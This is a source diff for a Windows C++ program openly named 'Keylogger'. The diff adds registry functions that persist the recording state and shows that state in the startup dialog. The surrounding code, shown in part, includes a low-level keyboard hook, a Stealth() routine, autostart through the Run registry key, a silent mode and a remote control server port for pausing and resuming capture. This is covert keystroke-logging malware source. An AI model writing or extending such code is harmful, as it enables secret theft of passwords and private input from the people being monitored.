@@ -343,6 +343,38 @@ bool SetSilentMode(bool enable)
     return result;
 }
 
+// 录制状态注册表项
+const wchar_t* RECORDING_STATE_VALUE = L"RecordingState";
+
+// 获取保存的录制状态
+bool GetSavedRecordingState()
+{
+    HKEY hKey;
+    DWORD value = 1, size = sizeof(value); // 默认开始录制
+    if (RegOpenKeyExW(HKEY_CURRENT_USER, REG_RUN_PATH, 0, KEY_READ, &hKey) == ERROR_SUCCESS)
+    {
+        if (RegQueryValueExW(hKey, RECORDING_STATE_VALUE, NULL, NULL, (LPBYTE)&value, &size) == ERROR_SUCCESS)
+        {
+            RegCloseKey(hKey);
+            return value == 1;
+        }
+        RegCloseKey(hKey);
+    }
+    return true; // 默认开始录制
+}
+
+// 保存录制状态
+bool SaveRecordingState(bool isRecording)
+{
+    HKEY hKey;
+    if (RegOpenKeyExW(HKEY_CURRENT_USER, REG_RUN_PATH, 0, KEY_WRITE, &hKey) != ERROR_SUCCESS)
+        return false;
+    DWORD value = isRecording ? 1 : 0;
+    bool result = (RegSetValueExW(hKey, RECORDING_STATE_VALUE, 0, REG_DWORD, (BYTE*)&value, sizeof(value)) == ERROR_SUCCESS);
+    RegCloseKey(hKey);
+    return result;
+}
+
 std::string GetLocalIPAddress()
 {
     std::string ip = "unknown";
@@ -686,10 +718,12 @@ std::string ProcessCommand(const std::string& command)
         }
         else if (action == "pause_record") {
             isRecording = false;
+            SaveRecordingState(isRecording);
             response["type"] = "record_paused";
         }
         else if (action == "resume_record") {
             isRecording = true;
+            SaveRecordingState(isRecording);
             response["type"] = "record_resumed";
         }
         else if (action == "get_status") {
@@ -904,6 +938,9 @@ LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
             if (kbdStruct.vkCode == 'P' && (GetKeyState(VK_CONTROL) & 0x8000) && (GetKeyState(VK_SHIFT) & 0x8000) && (GetKeyState(VK_MENU) & 0x8000))
             {
                 isRecording = !isRecording;
+                // 保存录制状态到注册表
+                SaveRecordingState(isRecording);
+                
                 if (isRecording)
                 {
                     std::cout << "Recording resumed\n";
@@ -1171,15 +1208,19 @@ int main()
 
     Stealth();
 
+    // 读取上次保存的录制状态
+    isRecording = GetSavedRecordingState();
+
     if (!IsSilentMode()) {
         wchar_t msg[512];
-        swprintf_s(msg, L"Keylogger 已启动\n\n快捷键说明:\n"
+        swprintf_s(msg, L"Keylogger 已启动\n\n当前状态: %s\n\n快捷键说明:\n"
             L"Ctrl + Shift + Alt + P  暂停/继续录制\n"
             L"Ctrl + Shift + Alt + Q  停止录制\n"
             L"Ctrl + Shift + Alt + S  启用/禁用开机自启\n"
             L"Ctrl + Shift + Alt + D  启用/禁用静默模式\n\n"
             L"日志保存在 %%appdata%%\\Keylogger\n"
             L"服务器控制端口: %d",
+            isRecording ? L"录制中" : L"已暂停",
             g_localPort);
         MessageBoxW(NULL, msg, L"Keylogger", MB_OK);
     }
